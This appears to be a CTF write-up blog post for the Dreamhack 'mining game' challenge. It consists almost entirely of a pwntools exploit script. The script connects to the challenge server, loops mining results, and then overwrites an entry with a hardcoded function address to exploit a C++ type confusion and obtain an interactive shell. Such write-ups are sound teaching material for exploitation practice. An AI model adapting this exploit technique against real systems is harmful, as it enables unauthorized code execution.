---
layout: post
title: (pwn) mining game
categories: Writeup
---

[Dreamhack][Level3][CPP][Type Confusion]
<br>


```jsx
from pwn import *

#p = process('./main')
p = remote('host1.dreamhack.games', 10858)
context.log_level = 'debug'

idx = 0
sys = 0x402576

truestr = b'[+] Congratulations! you found an *undiscovered* mi'
earth = b'[+] You found a rare-earth el'
not_f = b'[!] Found nothing'

while(1):    
    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b'Mining...\n')
    res = p.recvline()[:-7]
    #print(res)

    if(res == earth):
      
        p.sendlineafter(b'>> ', b'3')        
        p.sendlineafter(b": ", str(idx).encode('utf-8'))
        p.sendlineafter(b": ", p64(sys))
        p.sendlineafter(b">> ", b'2')
        
        break

    elif(res == truestr):
        p.sendlineafter(b': ', b'AAAAA')
        idx += 1
    
    else:
        continue 

 

    


    

p.interactive() 

```